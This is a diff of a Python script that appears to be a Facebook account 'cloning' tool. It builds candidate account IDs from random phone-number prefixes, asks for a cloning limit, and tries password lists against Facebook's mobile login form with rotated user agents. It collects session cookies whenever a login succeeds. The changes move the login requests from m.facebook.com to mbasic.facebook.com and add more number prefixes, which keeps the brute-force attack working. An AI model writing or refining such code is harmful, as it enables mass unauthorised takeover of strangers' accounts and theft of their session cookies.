@@ -151,8 +151,11 @@ def xxr():
     print(logo)
     print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
     print(" ══════════════════════════════════════════")
-    rk1 = '017'
-    code = random.choice(rk1)                      # input(f' [{xr}■{x}] Choose : ')
+    rk1 = '01711'
+    rk2 = '01722'
+    rk3 = '01755'
+    rk4 = '017'
+    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
     print(logo)
     limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
@@ -195,7 +198,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -206,7 +209,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'm.facebook.com',
+            header_freefb = {"authority": 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -221,7 +224,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
